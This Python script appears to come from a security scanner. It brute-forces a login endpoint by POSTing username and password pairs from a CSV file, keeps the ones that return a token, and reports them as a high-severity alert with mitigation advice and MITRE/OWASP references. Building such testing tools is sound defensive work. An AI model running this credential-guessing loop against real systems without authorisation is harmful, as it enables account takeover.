# <target> <path> <payload> <fields> <datafile> <token>[json|form]
import os
import sys
import json
import requests

sys.path.append(os.path.dirname(os.path.realpath(__file__)) + os.sep + "shlib")

from shlib.prancer_site import get_site
from shlib.prancer_result import get_result
from shlib.prancer_spider import get_spider
from shlib.prancer_output import get_output


ATTACK_DESCRIPTION = """A Brute force attack is a method to determine an unknown value by using an automated process to try a large number of possible values. The attack takes advantage of the fact that the entropy of the values is smaller than perceived. For example, while an 8 character alphanumeric password can have 2.8 trillion possible values, many people will select their passwords from a much smaller subset consisting of common words and terms"""

OTHER_INFO = """Brute-force attacks work by calculating every possible combination that could make up a password and testing it to see if it is the correct password. As the passwords length increases, the amount of time, on average, to find the correct password increases exponentially. Brute force attacks accounted for five percent of confirmed security breaches for its simple attack method and high success rate"""

SOLUTION = """ 1.Account Use Policies - Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Too strict a policy may create a denial of service condition and render environments un-usable, with all accounts used in the brute force being locked-out.
               2.Multi-factor Authentication - Use multi-factor authentication. Where possible, also enable multi-factor authentication on externally facing services.
               3.Password Policies - Refer to NIST guidelines when creating password policies (https://pages.nist.gov/800-63-3/sp800-63b.html)
               4.User Account Management - Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts  """

REFERENCE = """  1.https://attack.mitre.org/techniques/T1110/
                 2.https://owasp.org/www-community/attacks/Brute_force_attack """

def pr_alert(url, fullurl, reqs=None, resps=None):

  if reqs and resps:
      instances = []
      for req, resp in zip(reqs, resps):
          # Message 1 Content:
          msg_data1 = {
              "uri": fullurl,
              "method": "POST",
              "param": "",
              "attack": req,
              "evidence": "Payload: %s, Response: %s" % (req, resp)
          } 
          instances.append(msg_data1)
 
      title = "Brute Force Attack Python Script for user login"

      # Alert Content:
      alert_data = {
          "alertid": "",
          "name": title,
          "severity": "High",
          "desc": ATTACK_DESCRIPTION,
          "count": "",
          "solution": SOLUTION,
          "reference":REFERENCE,
          "cweid": "302",
          "wascid": "11",
          "sourceid": "",
          "instances": []
      }

      # Add Messages to alertItem
      alert_data["instances"].extend(instances)
      alert_data["count"] = "%d" % len(alert_data["instances"])
      site_data = get_site(None, url)
      site_data['alerts'].append(alert_data)
      result_data = get_result(None)
      result_data["site"].append(site_data)

      spider_data = get_spider(None, 'spider', fullurl)
      output = get_output(None)
      output["Result"] = result_data
      output["Spider"] = spider_data
      return output
  return None

def usage():
    print("Usage: python3 run-bruteforce.py <target> <path> <payload> <fields> <datafile> <token> [json|form]")
    print('''
      target: eg: https://vampi.prancer.cloud/
      path: eg: users/v1/login
      payload: eg: '{"username": "%%username%%", "password": "%%password%%"}'
                   'username=%%username%%&password=%%password%%'
      fields: 'username,password'
      datafile: csv file containing username and password list to be tried
      token: response token field  
      json|form: For Content-Type: 'application/json' or 'application/x-www-form-urlencoded'
    ''')
    sys.exit(1)

def exists_file(fname):
    """Check if path exists and is a file"""
    if fname and os.path.exists(fname) and os.path.isfile(fname):
        return True
    return False


if __name__ == '__main__':
    # Get the input parameters
    if len(sys.argv) < 5:
        usage()
    url = sys.argv[1]
    path = sys.argv[2]
    fullurl = "%s/%s" % (url, path)
    payload = '{"username": "%%username%%", "password": "%%password%%"}'
    fields = sys.argv[3].split(',')
    inputfile = sys.argv[4]
    tkn = sys.argv[5]
    reqType = 'json'
    if len(sys.argv) > 6 :
        reqType = 'json' if sys.argv[6] == 'json' else 'form'
    if not exists_file(inputfile):
        print("Input file: %s does not exist, exiting...." % inputfile)
        sys.exit(1)
    if reqType == 'json':
        hdrs = {"Content-Type": "application/json"}
    else:
        hdrs = {"Content-Type": "application/x-www-form-urlencoded"} 
    reqs = []
    resps = []
    with open(inputfile) as f:
        for l in f:
            vals = l.strip().split(',')
            pl = payload
            for i, field in enumerate(fields):
                key='%%' + field + '%%'
                # print(key)
                pl = pl.replace(key, vals[i])
            # print(pl)
            r = requests.post(fullurl, data=pl, headers=hdrs)
            if r.status_code == 200 :
                # print(r.status_code)
                resp = r.json()
                if tkn in resp and resp[tkn]:
                    # print(resp)
                    reqs.append(pl)
                    resps.append(json.dumps(resp))
    if reqs and resps:
        # print("Bruteforce attack successful...")
        # print(reqs)
        data = pr_alert(url, fullurl, reqs, resps)
        print(json.dumps(data, indent=2))
        exit(0)
    print("Failed to generate alert!....")
    exit(1)

